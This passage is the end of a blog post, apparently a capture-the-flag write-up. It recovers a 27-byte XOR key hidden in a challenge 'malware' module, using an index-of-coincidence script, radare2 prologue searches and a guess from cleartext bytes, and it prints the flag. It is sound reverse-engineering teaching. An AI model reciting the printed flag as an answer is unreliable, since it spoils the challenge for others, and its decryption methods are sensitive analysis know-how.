+<img src="/images/crowdstrike-decrypt.png" alt="/images/crowdstrike-decrypt.png" title="/images/crowdstrike-decrypt.png" /></p>
+<p>
+Once decrypted it jumps to that region of memory. So I knew that the key XORed with <code class="verbatim">0x40a0</code> has to yield valid x86_64 assembly. The first thing I wanted to figure out is what the key length was. I used the python in <a href="https://crypto.stackexchange.com/questions/35318/cryptanalysis-of-xor-cipher-with-repeated-key-phrase">this</a> StackOverflow link to determine the Incidence of Coincidence.</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">go</span>(msg):
+    <span style="color:#66d9ef">for</span> step <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">50</span>):
+        match <span style="color:#f92672">=</span> total <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(msg)):
+            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(i <span style="color:#f92672">+</span> step, len(msg), step):
+                total <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+                <span style="color:#66d9ef">if</span> msg[i] <span style="color:#f92672">==</span> msg[j]: match <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+        ioc <span style="color:#f92672">=</span> float(match) <span style="color:#f92672">/</span> float(total)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%3d%7.2f%%</span><span style="color:#e6db74"> </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (step, <span style="color:#ae81ff">100</span><span style="color:#f92672">*</span>ioc, <span style="color:#e6db74">&#34;#&#34;</span> <span style="color:#f92672">*</span> int(<span style="color:#ae81ff">0.5</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">500</span><span style="color:#f92672">*</span>ioc)))
+
+go(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x16\x1b\xf2\x86\x3a\xfa\x9c\x64\x78\xd6\x1c\x96\x7c\xe7\x3c\x8b\x79\xfa\x98\xd8\x43\x5f\x63\x30\xed\xf4\x95\x43\x53\x7b\x63\x27\x31\xf9\x91\x78\xdc\x8d\x7e\xbd\x11\x85\xf8\x74\x8f\x17\xa8\x26\xd6\xa4\x78\xa3\xf3\x41\x43\x53\x7b\x6c\x77\xf2\x35\x88\xb9\x98\x89\xb4\xcb\x93\x86\x26\x79\xfa\xba\x78\xed\xb3\x43\x78\xed\x4e\x95\x84\x16\x87\x63\x72\x79\x70\x3c\xbb\x1a\x89\x26\xbd\x29\x89\x98\x38\xf0\x1a\xcc\x6f\x17\xe0\x75\x94\x32\x35\xc8\x16\x8b\x6c\xc4\x79\xf4\xb4\x45\xb3\xea\x3b\xc8\x24\xf2\x36\xd9\x3b\xd6\xf6\xd1\x5e\x63\x30\x64\xdb\x7f\x43\x53\x7b\xaa\xb1\x2c\x38\xfd\xd5\xd6\x1c\x82\x7c\xe5\x0c\x93\xb8\x26\xb7\xbb\x2b\xb3\x2b\xa8\x2c\xba\xba\x0b\xd8\x3e\x83\x3a\xf0\xb6\xff\x75\xb7\x29\xf6\x7c\xe5\xbb\x3b\xf6\xb3\x5e\x30\x6e\x5f\x6c\x35\xed\xf3\xf4\x06\xaf\xf0\x26\x8e\x24\xb3\xc4</span><span style="color:#e6db74">&#34;</span>)</code></pre></div>
+</div>
+<pre class="example">
+  1   0.74% ####
+  2   0.77% ####
+  3   1.21% ######
+  4   0.65% ###
+  5   0.71% ####
+  6   1.24% ######
+  7   0.45% ##
+  8   0.60% ###
+  9   2.09% ##########
+ 10   0.54% ###
+ 11   0.48% ##
+ 12   0.99% #####
+ 13   1.00% #####
+ 14   0.62% ###
+ 15   0.92% #####
+ 16   0.54% ###
+ 17   0.29% #
+ 18   2.04% ##########
+ 19   0.54% ###
+ 20   0.69% ###
+ 21   0.72% ####
+ 22   0.89% ####
+ 23   1.07% #####
+ 24   0.70% ####
+ 25   1.03% #####
+ 26   1.08% #####
+ 27   5.62% ############################
+ 28   0.67% ###
+ 29   0.52% ###
+ 30   0.54% ###
+ 31   0.75% ####
+ 32   0.20% #
+ 33   0.61% ###
+ 34   0.21% #
+ 35   0.43% ##
+ 36   1.57% ########
+ 37   0.47% ##
+ 38   0.24% #
+ 39   2.25% ###########
+ 40   0.77% ####
+ 41   0.53% ###
+ 42   1.09% #####
+ 43   0.28% #
+ 44   0.57% ###
+ 45   1.78% #########
+ 46   0.61% ###
+ 47   0.31% ##
+ 48   0.65% ###
+ 49   0.34% ##
+</pre>
+<p>
+This seemed pretty likely that the key length was 27. I then used a couple of different methods to reconstruct the key. Firstly was just observing the memory and reconstructing based on some of the cleartext ascii and the known key length.</p>
+<p>
+The cleartext ascii was the result of XORing the key with 0x00. From this I could determine the key probably looked something like: <code class="verbatim">CS{crypt...........0n_c0d3}</code> . I could probablt infer a couple of additional characters <code class="verbatim">CS{crypt0_........_0n_c0d3}</code>.</p>
+<p>
+As a quick aside I want to say that I tried a LOT of things in this stage including:</p>
+<ul>
+<li>
+<p>XORing with some other common x86_64 repeated bytes</p>
+</li>
+<li>
+<p>XORing the memory with <code class="verbatim">0xFF</code> as that byte also tends to repeat in x86. (If I was a bit more observant this would have given me more of the key but I missed it….)</p>
+</li>
+<li>
+<p>Brute forcing all 8 letter words with 1337speak rules applied (which seems to have narrowly missed hitting the solution)</p>
+</li>
+</ul>
+<p>I then took a bit of an unorthodox approach. I can confim that the function prologue XORed with the first bytes @ <code class="verbatim">0x40a0</code> yield my key…</p>
+<p>
+How different can 196 byte functions really be in x86_64?</p>
+<p>
+It&#39;s a 27 byte key and I only need the first 18 bytes to match to guess the key. So I fired up radare, loaded in the <code class="verbatim">malware</code> module from the previous challenge, searched for all the function prologues I could find, and printed 27 bytes of hex for each</p>
+<div class="src src-r2">
+<pre><code class="language-r2" data-lang="r2">[0x0091b8e6]&gt; /x 554889e54883ec
+Searching 7 bytes in [0x28e1f30-0x28fec98]
+hits: 0
+Searching 7 bytes in [0x28cffe0-0x28e1f30]
+hits: 0
+Searching 7 bytes in [0x400000-0x26cf054]
+hits: 522
+0x0091b8e6 hit11_0 554889e54883ec
+0x0091bcde hit11_1 554889e54883ec
+0x00925ce0 hit11_2 554889e54883ec
+0x00925d50 hit11_3 554889e54883ec
+0x009281b0 hit11_4 554889e54883ec
+0x00928210 hit11_5 554889e54883ec
+0x009e3bf0 hit11_6 554889e54883ec
+...
+
+[0x0091b8e6]&gt; p8 27 @@ hit* &gt;hailmary.txt</code></pre>
+</div>
+<p>
+I loaded these into cyberchef with the first 27 bytes of <code class="verbatim">0x40a0</code> as the XOR key and started looking in the output for any cleartext strings.</p>
+<p>
+No luck.</p>
+<p>
+As a last try I repeated the same steps with every single binary in `/usr/bin/ <code class="verbatim">cat</code>&#39;d into an uberfile</p>
+<div class="src src-bash">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /usr/bin/* &gt; uberfile
+r2 uberfile</code></pre></div>
+</div>
+<p>
+and I got a HIT!</p>
+<div class="src src-shell">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">person@ubuntu:~/Desktop$ ./module.wow CS<span style="color:#f92672">{</span>crypt0_an4lys1s_0n_c0d3<span style="color:#f92672">}</span>
+CS<span style="color:#f92672">{</span>crypt0_an4lys1s_0n_c0d3<span style="color:#f92672">}</span></code></pre></div>
+</div>
+<p>
+Key: <code class="verbatim">CS{crypt0_an4lys1s_0n_c0d3}</code></p>
+</div>
+</div>
+</div>
+</div>
+
+      </div></div>
+  
+  <div class="pagination">
+    <div class="pagination__title">
+      <span
+        class="pagination__title-h">Read other posts</span>
+      <hr />
+    </div>
+    <div class="pagination__buttons">
+      
+      
+      <span class="button next">
+        <a href="https://noonker.github.io/posts/2021-01-03-json-to-org-table/">
+          <span class="button__text">Json To Org-Mode Table</span>
+          <span class="button__icon">→</span>
+        </a>
+      </span>
+      
+    </div>
+  </div>
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2021 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://noonker.github.io/assets/main.js"></script>
+<script src="https://noonker.github.io/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
